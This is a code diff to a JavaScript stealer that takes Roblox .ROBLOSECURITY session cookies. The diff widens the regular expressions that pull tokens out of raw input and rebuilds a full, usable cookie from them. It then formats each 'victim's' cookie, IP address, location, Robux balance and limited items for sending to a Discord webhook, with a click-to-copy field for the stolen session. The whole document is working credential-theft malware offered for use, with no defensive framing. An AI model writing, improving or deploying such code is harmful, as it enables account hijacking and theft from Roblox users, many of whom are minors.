@@ -40,14 +40,24 @@ async function getIpGeo(ip) {
 function extractRobloxCookie(raw) {
   if (!raw) return null;
   
-  const fullMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
+  // Clean the input first
+  const cleaned = raw.trim().replace(/\s+/g, ' ');
+  
+  // Full cookie with warning prefix
+  const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
   if (fullMatch) return fullMatch[1];
   
-  const warningMatch = raw.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
+  // Token after warning
+  const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
   if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
   
-  const tokenOnly = raw.match(/\|_([\w\-]{50,})/);
+  // Bare token after |_
+  const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
   if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
+  
+  // Just the token (alphanumeric with dashes/dots, 100+ chars)
+  const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
+  if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;
   
   return null;
 }
@@ -161,7 +171,8 @@ async function sendToDiscord(webhookUrl, data) {
   const victimLocation = geo ? `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}` : 'Unknown';
   const flag = geo?.countryCode || '';
   
-  const cookieDisplay = cookie || rawValue?.substring(0, 800) || 'No cookie captured';
+  // Ensure cookie is clean - no newlines, no extra spaces
+  const cleanCookie = cookie ? cookie.trim() : rawValue?.substring(0, 800).trim() || 'No cookie captured';
 
   const fields = [
     field("👤 Username", roblox?.username || 'Unknown', true),
@@ -174,7 +185,8 @@ async function sendToDiscord(webhookUrl, data) {
     field("💰 Account Funds", `Balance: ${roblox?.robux?.toLocaleString() || 0}`, true),
     field("🛒 Limiteds", `Count: ${roblox?.limitedsCount || 0}\nValue: ${roblox?.limitedsValue?.toLocaleString() || 0}`, true),
     field("🌐 IP Address", ip || 'Unknown', true),
-    field("🔐 .ROBLOSECURITY (Click to Copy)", `\`\`\`\n${cookieDisplay}\n\`\`\``, false)
+    // NO NEWLINES inside code block - just the raw cookie
+    field("🔐 .ROBLOSECURITY (Click Copy Button ▶️)", `\`\`\`${cleanCookie}\`\`\``, false)
   ];
 
   const payload = {
